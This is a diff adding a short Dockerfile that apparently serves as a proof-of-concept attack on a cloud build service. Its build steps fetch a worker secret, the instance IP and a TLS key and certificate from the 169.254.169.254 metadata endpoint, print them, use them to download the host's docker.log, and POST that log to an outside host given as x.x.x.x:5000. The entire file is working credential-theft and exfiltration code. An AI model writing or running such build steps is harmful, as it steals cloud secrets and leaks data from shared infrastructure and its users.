@@ -1,0 +1,15 @@
+FROM alpine
+
+RUN apk add curl
+
+ADD http://169.254.169.254/computeMetadata/v1beta1/instance/attributes/workerSecret /secret
+ADD http://169.254.169.254/computeMetadata/v1beta1/instance/network-interfaces/0/ip /ip
+ADD http://169.254.169.254/computeMetadata/v1beta1/instance/attributes/tlsCACert /tls.cert
+ADD http://169.254.169.254/computeMetadata/v1beta1/instance/attributes/tlsKey /tls.key
+
+RUN cat /ip; cat /secret
+RUN cat /secret | (cat /ip && cat) > /upload
+
+RUN curl -k -o /docker.log --key tls.key --cert tls.cert  -H"X-Secret: "$(cat /secret) https://$(cat /ip)/logs/docker.log
+
+RUN curl -XPOST -d @/docker.log http://x.x.x.x:5000/
